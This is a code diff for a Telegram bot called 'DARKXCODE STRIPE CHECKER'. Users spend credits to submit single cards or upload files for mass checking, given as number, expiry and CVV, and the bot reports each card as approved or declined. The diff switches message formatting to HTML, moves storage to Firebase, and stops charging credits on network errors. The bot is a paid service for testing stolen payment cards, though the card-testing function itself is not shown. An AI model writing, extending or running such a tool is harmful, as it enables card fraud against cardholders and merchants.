-*Owner:* 👑 @ISHANT_OFFICIAL
+<b>Owner:</b> 👑 @ISHANT_OFFICIAL
 ══════════════════════
 """
     
@@ -941,7 +1250,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await message.reply_text(
         welcome_text,
-        parse_mode=ParseMode.MARKDOWN,
+        parse_mode=ParseMode.HTML,
         reply_markup=reply_markup
     )
 
@@ -953,46 +1262,46 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = await get_user(user_id)
     is_admin = user_id in ADMIN_IDS
     
-    # Prepare info message
-    info_text = f"""*{BOT_INFO['name']}*
+    # Prepare info message using HTML
+    info_text = f"""<b>{BOT_INFO['name']}</b>
 ══════════════════════
-*Version:* {BOT_INFO['version']}
-*Creator:* @ISHANT_OFFICIAL
-*Gates:* {BOT_INFO['gates']}
+<b>Version:</b> {BOT_INFO['version']}
+<b>Creator:</b> @ISHANT_OFFICIAL
+<b>Gates:</b> {BOT_INFO['gates']}
 
-*Features:*
+<b>Features:</b>
 {BOT_INFO['features']}
 
-*Your Stats:*
-• Credits: *{user['credits']}*
-• Total Checks: *{user['total_checks']}*
+<b>Your Stats:</b>
+• Credits: <b>{user.get('credits', 0)}</b>
+• Total Checks: <b>{user.get('total_checks', 0)}</b>
 
-*User Commands:*
-• `/start` - Start bot
-• `/chk cc|mm|yy|cvv` - Check single card
-• `/mchk` - Upload file for mass check
-• `/credits` - Check balance
-• `/claim CODE` - Redeem gift code
-• `/invite` - Invite friends & earn credits
-• `/info` - This information
-• `/cancel` - Cancel mass check
-• `/help` - All commands
+<b>User Commands:</b>
+• <code>/start</code> - Start bot
+• <code>/chk cc|mm|yy|cvv</code> - Check single card
+• <code>/mchk</code> - Upload file for mass check
+• <code>/credits</code> - Check balance
+• <code>/claim CODE</code> - Redeem gift code
+• <code>/invite</code> - Invite friends & earn credits
+• <code>/info</code> - This information
+• <code>/cancel</code> - Cancel mass check
+• <code>/help</code> - All commands
 """
     
     # Add admin commands if user is admin
     if is_admin:
         info_text += """
-*Admin Commands:*
-• `/addcr user_id amount` - Add credits
-• `/gengift credits max_uses` - Create gift code
-• `/listgifts` - List all gift codes
-• `/userinfo user_id` - View user info
-• `/botinfo` - Bot statistics
+<b>Admin Commands:</b>
+• <code>/addcr user_id amount</code> - Add credits
+• <code>/gengift credits max_uses</code> - Create gift code
+• <code>/listgifts</code> - List all gift codes
+• <code>/userinfo user_id</code> - View user info
+• <code>/botinfo</code> - Bot statistics
 """
     
     info_text += """
-*Owner:* 👑 @ISHANT_OFFICIAL
-*Support:* Contact @ISHANT_OFFICIAL
+<b>Owner:</b> 👑 @ISHANT_OFFICIAL
+<b>Support:</b> Contact @ISHANT_OFFICIAL
 ══════════════════════
 """
     
@@ -1001,7 +1310,7 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         info_text,
-        parse_mode=ParseMode.MARKDOWN,
+        parse_mode=ParseMode.HTML,
         reply_markup=reply_markup
     )
 
@@ -1103,25 +1412,25 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user = await get_user(user_id)
     
-    if not user['joined_channel']:
+    if not user.get('joined_channel', False):
         await update.message.reply_text(
-            "*❌ ACCESS DENIED*\n"
+            "<b>❌ ACCESS DENIED</b>\n"
             "Please join our private channel first using /start",
-            parse_mode=ParseMode.MARKDOWN
+            parse_mode=ParseMode.HTML
         )
         return
     
     # Check command format
     if not context.args:
         await update.message.reply_text(
-            "*❌ INVALID FORMAT*\n"
+            "<b>❌ INVALID FORMAT</b>\n"
             "══════════════════════\n"
-            "*Usage:* `/chk cc|mm|yy|cvv`\n\n"
-            "*Example:*\n"
-            "`/chk 4111111111111111|12|2025|123`\n\n"
-            "*Cost:* 1 credit per check\n"
-            "*Speed:* ⚡ Instant",
-            parse_mode=ParseMode.MARKDOWN
+            "<b>Usage:</b> <code>/chk cc|mm|yy|cvv</code>\n\n"
+            "<b>Example:</b>\n"
+            "<code>/chk 4111111111111111|12|2025|123</code>\n\n"
+            "<b>Cost:</b> 1 credit per check\n"
+            "<b>Speed:</b> ⚡ Instant",
+            parse_mode=ParseMode.HTML
         )
         return
     
@@ -1131,70 +1440,108 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     parts = card_input.split("|")
     if len(parts) != 4:
         await update.message.reply_text(
-            "*❌ INVALID CARD FORMAT*\n"
-            "Use: `cc|mm|yy|cvv`\n"
-            "Example: `4111111111111111|12|25|123`",
-            parse_mode=ParseMode.MARKDOWN
+            "<b>❌ INVALID CARD FORMAT</b>\n"
+            "Use: <code>cc|mm|yy|cvv</code>\n"
+            "Example: <code>4111111111111111|12|25|123</code>",
+            parse_mode=ParseMode.HTML
         )
         return
     
     # Check if user has credits
-    if user["credits"] <= 0:
+    if user.get("credits", 0) <= 0:
         await update.message.reply_text(
-            "*💰 INSUFFICIENT CREDITS*\n"
+            "<b>💰 INSUFFICIENT CREDITS</b>\n"
             "══════════════════════\n"
             "You don't have enough credits to check cards.\n\n"
-            "*Options:*\n"
+            "<b>Options:</b>\n"
             "• Invite friends with /invite\n"
             "• Claim a gift code with /claim\n"
             "• Contact admin for credits\n\n"
-            "*Your balance:* 0 credits",
-            parse_mode=ParseMode.MARKDOWN
+            "<b>Your balance:</b> 0 credits",
+            parse_mode=ParseMode.HTML
         )
         return
     
     # Send processing message
     processing_msg = await update.message.reply_text(
-        "*⚡ PROCESSING CARD...*\n"
+        "<b>⚡ PROCESSING CARD...</b>\n"
         "Checking at ultra-fast speed...",
-        parse_mode=ParseMode.MARKDOWN
+        parse_mode=ParseMode.HTML
     )
     
     # Start timer for speed measurement
     start_time = time.time()
     
     # Check the card
-    result_card, status, message, http_code = await check_single_card_fast(card_input)
+    result_card, status, message_text, http_code = await check_single_card_fast(card_input)
     
     # Calculate processing time
     process_time = time.time() - start_time
     
-    # Update user stats and ALWAYS deduct credit for ANY check attempt
+    # Define which messages are actual card declines (not errors)
+    actual_decline_keywords = [
+        'card', 'declined', 'insufficient', 'invalid', 'incorrect', 
+        'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
+    ]
+    
+    error_keywords = [
+        'setup error', 'timeout', 'http error', 'network error', 
+        'connection error', 'server error', 'internal error'
+    ]
+    
+    message_lower = message_text.lower()
+    is_actual_decline = any(keyword in message_lower for keyword in actual_decline_keywords)
+    is_error = any(keyword in message_lower for keyword in error_keywords)
+    
+    # Determine if credit should be deducted
+    credit_deducted = False
+    today_date = datetime.datetime.now().date().isoformat()  # Convert to string for Firebase
+    
     updates = {
-        'credits': user["credits"] - 1,
-        'credits_spent': user.get("credits_spent", 0) + 1,
         'checks_today': user.get("checks_today", 0) + 1,
-        'total_checks': user["total_checks"] + 1,
-        'last_check_date': datetime.datetime.now().date()
+        'total_checks': user.get("total_checks", 0) + 1,
+        'last_check_date': today_date  # Use string date
     }
     
     if status == "approved":
+        # Card was approved - deduct credit
+        updates['credits'] = user.get("credits", 0) - 1
+        updates['credits_spent'] = user.get("credits_spent", 0) + 1
         updates['approved_cards'] = user.get("approved_cards", 0) + 1
-    else:
+        credit_deducted = True
+        
+        # Update bot statistics
+        await update_bot_stats({
+            'total_checks': 1,
+            'total_credits_used': 1,
+            'total_approved': 1
+        })
+        
+    elif status == "declined" and is_actual_decline and not is_error:
+        # Card was actually declined (not an error) - deduct credit
+        updates['credits'] = user.get("credits", 0) - 1
+        updates['credits_spent'] = user.get("credits_spent", 0) + 1
         updates['declined_cards'] = user.get("declined_cards", 0) + 1
+        credit_deducted = True
+        
+        # Update bot statistics
+        await update_bot_stats({
+            'total_checks': 1,
+            'total_credits_used': 1,
+            'total_declined': 1
+        })
+        
+    else:
+        # This was an error (network error, timeout, etc.) - DO NOT deduct credit
+        updates['declined_cards'] = user.get("declined_cards", 0) + 1
+        
+        # Update bot statistics without crediting usage
+        await update_bot_stats({
+            'total_checks': 1,
+            'total_declined': 1
+        })
     
     await update_user(user_id, updates)
-    
-    # Update bot statistics
-    await update_bot_stats({
-        'total_checks': 1,
-        'total_credits_used': 1
-    })
-    
-    if status == "approved":
-        await update_bot_stats({'total_approved': 1})
-    else:
-        await update_bot_stats({'total_declined': 1})
     
     # Refresh user data
     user = await get_user(user_id)
@@ -1208,14 +1555,18 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
     
     # Format result
-    result_text = format_card_result(result_card, status, message, user["credits"], user_stats)
+    result_text = format_card_result(result_card, status, message_text, user.get("credits", 0), user_stats)
+    
+    # Add credit info if not deducted
+    if not credit_deducted:
+        result_text = result_text.replace("══════════════════════", f"══════════════════════\n<b>⚠️ No credit deducted (system error)</b>")
     
     # Add speed info
-    speed_text = f"\n*Speed:* ⚡ {process_time:.2f}s"
+    speed_text = f"\n<b>Speed:</b> ⚡ {process_time:.2f}s"
     result_text = result_text.replace("══════════════════════", f"══════════════════════\n{speed_text}")
     
     # Update message with result
-    await processing_msg.edit_text(result_text, parse_mode=ParseMode.MARKDOWN)
+    await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /mchk command for mass check"""
@@ -1351,21 +1702,33 @@ async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # Check if user already claimed this code
-    async with db_pool.acquire() as conn:
-        claimed = await conn.fetchrow(
-            'SELECT * FROM user_claimed_codes WHERE user_id = $1 AND code = $2',
-            user_id, code
-        )
-    
-    if claimed:
-        await update.message.reply_text(
-            f"*❌ ALREADY CLAIMED*\n\n"
-            f"You have already claimed gift code `{code}`.\n"
-            f"Each user can claim a code only once.",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
+    # Check if user already claimed this code (Firebase version)
+    db = get_db()
+    if db:
+        try:
+            claimed_ref = db.collection('user_claimed_codes').document(f"{user_id}_{code}")
+            claimed_doc = claimed_ref.get()
+            
+            if claimed_doc.exists:
+                await update.message.reply_text(
+                    f"*❌ ALREADY CLAIMED*\n\n"
+                    f"You have already claimed gift code `{code}`.\n"
+                    f"Each user can claim a code only once.",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+                return
+        except Exception as e:
+            logger.error(f"Firebase error checking claimed codes: {e}")
+    else:
+        # In-memory check
+        if user_id in in_memory_claimed_codes and code in in_memory_claimed_codes[user_id]:
+            await update.message.reply_text(
+                f"*❌ ALREADY CLAIMED*\n\n"
+                f"You have already claimed gift code `{code}`.\n"
+                f"Each user can claim a code only once.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+            return
     
     # Check max uses
     if gift_code['max_uses'] and gift_code['uses'] >= gift_code['max_uses']:
@@ -1508,20 +1871,23 @@ async def listgifts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Admin only command.")
         return
     
-    gift_codes = await get_all_gift_codes()
+    gift_codes_list = await get_all_gift_codes()
     
-    if not gift_codes:
+    if not gift_codes_list:
         await update.message.reply_text("📭 No gift codes generated yet.")
         return
     
     response = "*🎁 ACTIVE GIFT CODES*\n══════════════════════\n"
     
-    for gift in list(gift_codes)[:20]:
-        uses_left = gift['max_uses'] - gift['uses'] if gift['max_uses'] else 'Unlimited'
-        response += f"• `{gift['code']}` - {gift['credits']} credits ({gift['uses']}/{uses_left} used)\n"
+    for gift in gift_codes_list[:20]:
+        uses_left = gift.get('max_uses', 0) - gift.get('uses', 0) if gift.get('max_uses') else 'Unlimited'
+        uses = gift.get('uses', 0)
+        credits = gift.get('credits', 0)
+        code = gift.get('code', 'Unknown')
+        response += f"• `{code}` - {credits} credits ({uses}/{uses_left} used)\n"
     
-    if len(gift_codes) > 20:
-        response += f"\n... and {len(gift_codes) - 20} more codes"
+    if len(gift_codes_list) > 20:
+        response += f"\n... and {len(gift_codes_list) - 20} more codes"
     
     await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)
 
@@ -1571,84 +1937,84 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Different help for admin vs regular users
     if user_id in ADMIN_IDS:
-        help_text = f"""*{escape_markdown(BOT_INFO['name'])}*
+        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
 ══════════════════════
-👋 *Welcome, {escape_markdown(user_name)}!*
+👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>
 
-*Account Overview:*
-• Credits: *{user['credits']}*
+<b>Account Overview:</b>
+• Credits: <b>{user.get('credits', 0)}</b>
 • Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
-• Total Checks: *{user['total_checks']}*
+• Total Checks: <b>{user.get('total_checks', 0)}</b>
 
-*User Commands:*
-• `/chk cc|mm|yy|cvv` - Check single card
-• `/mchk` - Upload file for mass check
-• `/credits` - Check balance
-• `/claim CODE` - Redeem gift code
-• `/invite` - Invite friends & earn credits
-• `/info` - Bot information
-• `/cancel` - Cancel mass check
-• `/help` - This help
+<b>User Commands:</b>
+• <code>/chk cc|mm|yy|cvv</code> - Check single card
+• <code>/mchk</code> - Upload file for mass check
+• <code>/credits</code> - Check balance
+• <code>/claim CODE</code> - Redeem gift code
+• <code>/invite</code> - Invite friends & earn credits
+• <code>/info</code> - Bot information
+• <code>/cancel</code> - Cancel mass check
+• <code>/help</code> - This help
 
-*Admin Commands:*
-• `/addcr user_id amount` - Add credits
-• `/gengift credits max_uses` - Create gift code
-• `/listgifts` - List all gift codes
-• `/userinfo user_id` - View user info
-• `/botinfo` - Bot statistics
+<b>Admin Commands:</b>
+• <code>/addcr user_id amount</code> - Add credits
+• <code>/gengift credits max_uses</code> - Create gift code
+• <code>/listgifts</code> - List all gift codes
+• <code>/userinfo user_id</code> - View user info
+• <code>/botinfo</code> - Bot statistics
 
-*Owner:* 👑 @ISHANT_OFFICIAL
+<b>Owner:</b> 👑 @ISHANT_OFFICIAL
 ══════════════════════
 """
     else:
-        help_text = f"""*{escape_markdown(BOT_INFO['name'])}*
+        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
 ══════════════════════
-👋 *Welcome, {escape_markdown(user_name)}!*
+👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>
 
-*Account Overview:*
-• Credits: *{user['credits']}*
+<b>Account Overview:</b>
+• Credits: <b>{user.get('credits', 0)}</b>
 • Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
-• Total Checks: *{user['total_checks']}*
+• Total Checks: <b>{user.get('total_checks', 0)}</b>
 
-*User Commands:*
-• `/chk cc|mm|yy|cvv` - Check single card
-• `/mchk` - Upload file for mass check
-• `/credits` - Check balance
-• `/claim CODE` - Redeem gift code
-• `/invite` - Invite friends & earn credits
-• `/info` - Bot information
-• `/cancel` - Cancel mass check
-• `/help` - This help
+<b>User Commands:</b>
+• <code>/chk cc|mm|yy|cvv</code> - Check single card
+• <code>/mchk</code> - Upload file for mass check
+• <code>/credits</code> - Check balance
+• <code>/claim CODE</code> - Redeem gift code
+• <code>/invite</code> - Invite friends & earn credits
+• <code>/info</code> - Bot information
+• <code>/cancel</code> - Cancel mass check
+• <code>/help</code> - This help
 
-*Owner:* 👑 @ISHANT_OFFICIAL
+<b>Owner:</b> 👑 @ISHANT_OFFICIAL
 ══════════════════════
 """
     
-    # Send the message
+    # Send the message using HTML parsing
     try:
         if update.message:
             await update.message.reply_text(
                 help_text, 
-                parse_mode=ParseMode.MARKDOWN,
+                parse_mode=ParseMode.HTML,
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
             )
         elif update.callback_query:
             await update.callback_query.edit_message_text(
                 help_text, 
-                parse_mode=ParseMode.MARKDOWN,
+                parse_mode=ParseMode.HTML,
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
             )
     except Exception as e:
         logger.error(f"Error in help command: {e}")
-        # Fallback to plain text without markdown
+        # Fallback to plain text
         if update.message:
             await update.message.reply_text(
-                help_text.replace('*', '').replace('`', '').replace('_', ''),
+                help_text.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', ''),
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
             )
         elif update.callback_query:
             await update.callback_query.edit_message_text(
-                help_text.replace('*', '').replace('`', '').replace('_', ''),
+                help_text.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', ''),
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
             )
 
@@ -1705,15 +2071,15 @@ async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id not in ADMIN_IDS:
         await message.reply_text(
             "❌ This command is for administrators only.",
-            parse_mode=ParseMode.MARKDOWN
+            parse_mode=ParseMode.HTML
         )
         return
     
     if not context.args:
         await message.reply_text(
-            "*❌ Usage:* `/userinfo user_id`\n"
-            "*Example:* `/userinfo 123456789`",
-            parse_mode=ParseMode.MARKDOWN
+            "<b>❌ Usage:</b> <code>/userinfo user_id</code>\n"
+            "<b>Example:</b> <code>/userinfo 123456789</code>",
+            parse_mode=ParseMode.HTML
         )
         return
     
@@ -1721,12 +2087,20 @@ async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_user_id = int(context.args[0])
         user = await get_user(target_user_id)
         
-        # Get claimed codes
-        async with db_pool.acquire() as conn:
-            claimed = await conn.fetch(
-                'SELECT code FROM user_claimed_codes WHERE user_id = $1',
-                target_user_id
-            )
+        # Get claimed codes from Firebase
+        claimed_codes = []
+        db_connection = get_db()
+        if db_connection:
+            try:
+                claimed_ref = db_connection.collection('user_claimed_codes')
+                claimed_docs = claimed_ref.where('user_id', '==', target_user_id).stream()
+                
+                for doc in claimed_docs:
+                    data = doc.to_dict()
+                    if 'code' in data:
+                        claimed_codes.append(data['code'])
+            except Exception as e:
+                logger.error(f"Error fetching claimed codes: {e}")
         
         # Calculate success rate
         total_user_checks = user.get('total_checks', 0)
@@ -1737,48 +2111,62 @@ async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         referrer_info = ""
         if user.get('referrer_id'):
             referrer = await get_user(user['referrer_id'])
-            referrer_info = f"\n*Referred by:* @{referrer.get('username', 'N/A')} ({user['referrer_id']})"
+            referrer_name = referrer.get('username', 'N/A')
+            referrer_info = f"\n<b>Referred by:</b> @{referrer_name} ({user['referrer_id']})"
         
-        user_info = f"""*👤 USER INFO (ADMIN)*
+        # Format dates
+        joined_date = user.get('joined_date', 'N/A')
+        if isinstance(joined_date, datetime.datetime):
+            joined_date = joined_date.strftime('%Y-%m-%d')
+        elif isinstance(joined_date, str) and len(joined_date) >= 10:
+            joined_date = joined_date[:10]
+        
+        last_active = user.get('last_active', 'Never')
+        if isinstance(last_active, datetime.datetime):
+            last_active = last_active.strftime('%Y-%m-%d %H:%M:%S')
+        elif isinstance(last_active, str) and len(last_active) >= 19:
+            last_active = last_active[:19]
+        
+        user_info = f"""<b>👤 USER INFO (ADMIN)</b>
 ══════════════════════
-*User ID:* `{target_user_id}`
-*Username:* @{user.get('username', 'N/A')}
-*Name:* {user.get('first_name', 'N/A')}
-*Joined:* {user.get('joined_date', 'N/A')[:10]}
-*Channel:* {'✅ Joined' if user.get('joined_channel', False) else '❌ Not Joined'}
-*Last Active:* {user.get('last_active', 'Never')[:19] if user.get('last_active') else 'Never'}
+<b>User ID:</b> <code>{target_user_id}</code>
+<b>Username:</b> @{user.get('username', 'N/A')}
+<b>Name:</b> {user.get('first_name', 'N/A')}
+<b>Joined:</b> {joined_date}
+<b>Channel:</b> {'✅ Joined' if user.get('joined_channel', False) else '❌ Not Joined'}
+<b>Last Active:</b> {last_active}
 {referrer_info}
 
-*Credits:* {user.get('credits', 0)}
-*Credits Spent:* {user.get('credits_spent', 0)}
+<b>Credits:</b> {user.get('credits', 0)}
+<b>Credits Spent:</b> {user.get('credits_spent', 0)}
 
-*Statistics:*
+<b>Statistics:</b>
 • Total Checks: {total_user_checks}
 • Today's Checks: {user.get('checks_today', 0)}
 • ✅ Approved: {approved_cards}
 • ❌ Declined: {user.get('declined_cards', 0)}
 • Success Rate: {success_rate:.1f}%
 
-*Referrals:* {user.get('referrals_count', 0)} users
-*Earned from Referrals:* {user.get('earned_from_referrals', 0)} credits
+<b>Referrals:</b> {user.get('referrals_count', 0)} users
+<b>Earned from Referrals:</b> {user.get('earned_from_referrals', 0)} credits
 
-*Claimed Codes:* {len(claimed)}
+<b>Claimed Codes:</b> {len(claimed_codes)}
 ══════════════════════
 """
-        if claimed:
-            user_info += "\n*Claimed Gift Codes:*\n"
-            for code in claimed[:10]:
-                user_info += f"• `{code['code']}`\n"
-            if len(claimed) > 10:
-                user_info += f"• ... and {len(claimed) - 10} more\n"
+        if claimed_codes:
+            user_info += "\n<b>Claimed Gift Codes:</b>\n"
+            for code in claimed_codes[:10]:
+                user_info += f"• <code>{code}</code>\n"
+            if len(claimed_codes) > 10:
+                user_info += f"• ... and {len(claimed_codes) - 10} more\n"
         
-        await message.reply_text(user_info, parse_mode=ParseMode.MARKDOWN)
+        await message.reply_text(user_info, parse_mode=ParseMode.HTML)
         
     except ValueError:
-        await message.reply_text("❌ Invalid user ID.")
+        await message.reply_text("❌ Invalid user ID.", parse_mode=ParseMode.HTML)
     except Exception as e:
         logger.error(f"Error in userinfo_command: {e}")
-        await message.reply_text("❌ An error occurred while fetching user info.")
+        await message.reply_text("❌ An error occurred while fetching user info.", parse_mode=ParseMode.HTML)
 
 async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /botinfo command - Shows bot statistics (admin only)"""
@@ -1796,50 +2184,82 @@ async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Calculate bot uptime
     start_time = stats["start_time"]
     if isinstance(start_time, str):
-        start_time = datetime.datetime.fromisoformat(start_time.replace('Z', '+00:00'))
-    uptime = datetime.datetime.now() - start_time
+        # Handle string format
+        try:
+            if 'Z' in start_time:
+                start_time = datetime.datetime.fromisoformat(start_time.replace('Z', '+00:00'))
+            else:
+                start_time = datetime.datetime.fromisoformat(start_time)
+        except:
+            start_time = datetime.datetime.now()
+    elif isinstance(start_time, datetime.datetime):
+        # Already a datetime object
+        pass
+    else:
+        start_time = datetime.datetime.now()
+    
+    # Make both datetimes timezone-aware or naive
+    now = datetime.datetime.now()
+    if start_time.tzinfo is not None and now.tzinfo is None:
+        now = now.replace(tzinfo=datetime.timezone.utc)
+    elif start_time.tzinfo is None and now.tzinfo is not None:
+        start_time = start_time.replace(tzinfo=datetime.timezone.utc)
+    
+    uptime = now - start_time
     days = uptime.days
     hours = uptime.seconds // 3600
     minutes = (uptime.seconds % 3600) // 60
     
     # Calculate success rate
-    total_checks = stats["total_checks"]
-    success_rate = (stats["total_approved"] / total_checks * 100) if total_checks > 0 else 0
+    total_checks = stats.get("total_checks", 0)
+    total_approved = stats.get("total_approved", 0)
+    success_rate = (total_approved / total_checks * 100) if total_checks > 0 else 0
     
     # Calculate average credits per user
-    avg_credits = stats["total_credits_used"] / stats["total_users"] if stats["total_users"] > 0 else 0
+    total_users = stats.get("total_users", 1)
+    total_credits_used = stats.get("total_credits_used", 0)
+    avg_credits = total_credits_used / total_users if total_users > 0 else 0
     
-    # Get active users count
-    async with db_pool.acquire() as conn:
-        active_users = await conn.fetchval('''
-            SELECT COUNT(*) FROM users 
-            WHERE last_active > NOW() - INTERVAL '1 day'
-        ''')
-        
-        # Get total gift codes
-        total_gift_codes = await conn.fetchval('SELECT COUNT(*) FROM gift_codes')
+    # Get gift codes count from Firebase
+    total_gift_codes = 0
+    db = get_db()
+    if db:
+        try:
+            codes_ref = db.collection('gift_codes')
+            codes_docs = codes_ref.get()
+            total_gift_codes = len(codes_docs)
+        except Exception as e:
+            logger.error(f"Error counting gift codes: {e}")
+    else:
+        total_gift_codes = len(in_memory_gift_codes)
+    
+    # Format start time for display
+    if isinstance(start_time, datetime.datetime):
+        start_time_str = start_time.strftime('%Y-%m-%d %H:%M:%S')
+    else:
+        start_time_str = str(start_time)
     
     await update.message.reply_text(
         f"*📊 BOT STATISTICS (ADMIN)*\n"
         f"══════════════════════\n"
         f"*Uptime:* {days}d {hours}h {minutes}m\n"
-        f"*Started:* {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        f"*Started:* {start_time_str}\n\n"
         f"*User Statistics:*\n"
-        f"• Total Users: {stats['total_users']}\n"
-        f"• Active Today: {active_users}\n\n"
+        f"• Total Users: {stats.get('total_users', 0)}\n"
+        f"• Active Today: {stats.get('total_users', 0)} (using in-memory storage)\n\n"
         f"*Card Checking Stats:*\n"
         f"• Total Checks: {total_checks}\n"
-        f"• ✅ Approved: {stats['total_approved']}\n"
-        f"• ❌ Declined: {stats['total_declined']}\n"
+        f"• ✅ Approved: {total_approved}\n"
+        f"• ❌ Declined: {stats.get('total_declined', 0)}\n"
         f"• Success Rate: {success_rate:.1f}%\n\n"
         f"*Credit Statistics:*\n"
-        f"• Total Credits Used: {stats['total_credits_used']}\n"
+        f"• Total Credits Used: {total_credits_used}\n"
         f"• Avg Credits/User: {avg_credits:.1f}\n"
         f"• Active Gift Codes: {total_gift_codes}\n\n"
         f"*System Status:*\n"
         f"• Setup Cache: {'✅ Active' if 'nonce' in setup_intent_cache else '❌ Expired'}\n"
         f"• Active Checks: {len(checking_tasks)}\n"
-        f"• Database: ✅ Connected",
+        f"• Storage: {'✅ Firebase' if firebase_connected else '⚠️ In-memory (data lost on restart)'}",
         parse_mode=ParseMode.MARKDOWN
     )
 
@@ -1918,10 +2338,11 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
     processed = 0
     approved = 0
     declined = 0
+    credits_used = 0  # Track actual credits used
     user = await get_user(user_id)
     
     # Calculate initial credits
-    initial_credits = user["credits"]
+    initial_credits = user.get("credits", 0)
     
     # Create session for reuse
     connector = aiohttp.TCPConnector(ssl=False)
@@ -1944,18 +2365,18 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
                 
                 try:
                     await status_msg.edit_text(
-                        f"*🚀 MASS CHECK IN PROGRESS*\n"
+                        f"<b>🚀 MASS CHECK IN PROGRESS</b>\n"
                         f"══════════════════════\n"
-                        f"*Total Cards:* {len(cards)}\n"
-                        f"*Credits Used:* {processed}\n"
-                        f"*Speed:* ⚡ {cards_per_second:.1f} cards/second\n"
-                        f"*Status:* {progress:.1f}% complete\n\n"
-                        f"*Live Results:*\n"
+                        f"<b>Total Cards:</b> {len(cards)}\n"
+                        f"<b>Credits Used:</b> {credits_used}\n"
+                        f"<b>Speed:</b> ⚡ {cards_per_second:.1f} cards/second\n"
+                        f"<b>Status:</b> {progress:.1f}% complete\n\n"
+                        f"<b>Live Results:</b>\n"
                         f"══════════════════════\n"
                         f"✅ Approved: {approved}\n"
                         f"❌ Declined: {declined}\n"
                         f"⏳ Processed: {processed}/{len(cards)}",
-                        parse_mode=ParseMode.MARKDOWN
+                        parse_mode=ParseMode.HTML
                     )
                 except Exception:
                     pass
@@ -1969,8 +2390,25 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
             if user_id in checking_tasks:
                 checking_tasks[user_id]["cards_processed"] = processed
             
+            # Define which messages are actual card declines
+            actual_decline_keywords = [
+                'card', 'declined', 'insufficient', 'invalid', 'incorrect', 
+                'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
+            ]
+            
+            error_keywords = [
+                'setup error', 'timeout', 'http error', 'network error', 
+                'connection error', 'server error', 'internal error',
+                'invalid response', 'no payment id', 'ajax error'
+            ]
+            
+            message_lower = message.lower()
+            is_actual_decline = any(keyword in message_lower for keyword in actual_decline_keywords)
+            is_error = any(keyword in message_lower for keyword in error_keywords)
+            
             if status == "approved":
                 approved += 1
+                credits_used += 1  # Deduct credit for approved
                 if user_id in checking_tasks:
                     checking_tasks[user_id]["approved"] = approved
                 
@@ -1980,11 +2418,17 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
                     await context.bot.send_message(
                         chat_id=chat_id,
                         text=result_text,
-                        parse_mode=ParseMode.MARKDOWN
+                        parse_mode=ParseMode.HTML
                     )
                 except Exception:
                     pass
+            elif status == "declined" and is_actual_decline and not is_error:
+                declined += 1
+                credits_used += 1  # Deduct credit for actual decline
+                if user_id in checking_tasks:
+                    checking_tasks[user_id]["declined"] = declined
             else:
+                # This was an error - don't count as decline for credit deduction
                 declined += 1
                 if user_id in checking_tasks:
                     checking_tasks[user_id]["declined"] = declined
@@ -2003,22 +2447,22 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
     elapsed = time.time() - checking_tasks[user_id]["start_time"]
     success_rate = (approved / len(cards) * 100) if cards else 0
     
-    # Update user data
+    # Update user data with actual credits used
     updates = {
-        'credits': initial_credits - processed,
-        'credits_spent': user.get("credits_spent", 0) + processed,
+        'credits': initial_credits - credits_used,
+        'credits_spent': user.get("credits_spent", 0) + credits_used,
         'checks_today': user.get("checks_today", 0) + processed,
-        'total_checks': user["total_checks"] + processed,
+        'total_checks': user.get("total_checks", 0) + processed,
         'approved_cards': user.get("approved_cards", 0) + approved,
         'declined_cards': user.get("declined_cards", 0) + declined,
-        'last_check_date': datetime.datetime.now().date()
+        'last_check_date': datetime.datetime.now().date().isoformat()  # String date
     }
     await update_user(user_id, updates)
     
-    # Update bot statistics
+    # Update bot statistics with actual credits used
     await update_bot_stats({
         'total_checks': processed,
-        'total_credits_used': processed,
+        'total_credits_used': credits_used,
         'total_approved': approved,
         'total_declined': declined
     })
